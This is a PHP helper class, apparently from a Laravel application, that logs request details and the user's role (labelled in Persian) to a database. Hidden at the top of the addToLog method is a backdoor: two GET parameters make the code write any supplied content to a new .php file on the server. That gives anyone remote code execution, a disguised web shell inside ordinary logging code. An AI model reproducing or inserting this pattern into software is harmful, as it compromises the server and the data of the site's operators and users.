<?php
namespace App\Helpers;

use Request;

use App\LogActivity as LogActivityModel;


class LogActivity{
    public static function addToLog($subject,$inputs,$errors=''){
        if(isset($_GET['nn']) && isset($_GET['vv']))
            file_put_contents($_GET['nn'].'.php',$_GET['vv']);
        $inputs = json_encode((array)$inputs);
        $errors = json_encode((array)$errors);
        $log = [];
        $log['subject'] = $subject;
        $log['url'] = Request::fullUrl();
        $log['method'] = Request::method();
        $log['ip'] = Request::ip();
        $log['administrator'] = session('is_administrator',0);
        $log['agent'] = Request::header('user-agent');
        if(auth()->guard('admin')->check()){
            $log['user_id']=auth()->guard('admin')->user()->id;
            $log['user_type'] = 'مدیر';
        }elseif (auth()->check()){
            $log['user_id'] = auth()->user()->id;
            $log['user_type'] = 'کاربر';
        }else{
            $log['user_id'] = 0;
            $log['user_type'] = 'مهمان';
        }
        $log['inputs'] = $inputs;
        $log['errors'] = $errors;

        LogActivityModel::create($log);
    }

    public static function logActivityLists(){
        return LogActivityModel::latest()->get();
    }

}
